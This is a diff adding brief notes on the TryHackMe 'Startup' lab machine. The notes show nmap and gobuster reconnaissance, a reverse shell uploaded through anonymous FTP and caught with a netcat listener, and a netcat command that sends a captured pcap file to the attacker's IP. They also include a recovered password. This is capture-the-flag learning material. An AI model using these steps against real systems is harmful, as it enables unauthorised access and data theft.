@@ -1,0 +1,29 @@
+TryHackMe -- Startup
+
+Target Info:
+IP address- 10.10.241.189
+-- `nmap sV sC 10.10.241.189`
+Ports:
+	- 21 (ftp, anon allowed)
+	- 22 (ssh)
+	- 80 (http)
+	
+GObuster:
+-- `gobuster dir -u http://10.10.241.189 -w /usr/share/wordlists/dirb/common.txt`
+
+Directories:
+	- /files
+	- /server-status
+	- /index.html
+
+
+/files has an /ftp directory, and with anon access, we can upload a reverse shell via ftp
+
+We will listen for the shells connection with `nc -lvnp 1234`
+
+Upon connection and running `whoami` we can see that we are under the `www-data` user. Running `ls` in the directory that we are in upon connection shows a `recipe.txt` and running `cat recipe.txt` shows us what the "secret ingredent" is.
+
+Target machine: `nc -w 3 10.13.41.239 8888 < suspicious.pcapng`
+My machine `nc -lp 8888 > suspicious.pcapng`
+
+Following the tcpstream shows us a password of c4ntg3t3n0ughsp1c3
